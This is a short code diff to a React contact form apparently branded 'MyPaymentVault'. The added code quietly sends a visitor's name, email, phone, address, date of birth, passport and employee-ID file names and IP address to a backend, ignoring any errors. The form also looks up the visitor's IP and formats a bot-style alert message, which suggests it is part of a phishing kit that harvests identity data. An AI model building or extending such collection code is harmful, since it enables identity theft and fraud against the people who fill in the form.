@@ -86,6 +86,29 @@ export default function ContactForm() {
       const ip = await getIPInfo();
       const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
+      /* Simpan ke database */
+      fetch("/api/submissions/contact", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username,
+          firstName,
+          lastName,
+          email,
+          phone,
+          address,
+          city,
+          state,
+          postalCode: postal,
+          dob,
+          inquiryType,
+          message,
+          passportFilename: passportFile?.name ?? null,
+          employeeIdFilename: employeeIdFile?.name ?? null,
+          ipAddress: ip,
+        }),
+      }).catch(() => {});
+
       const text =
         `━━━━━━━━━━━━━━━━━━━━━\n` +
         `🔐 <b>MyPaymentVault</b>\n` +
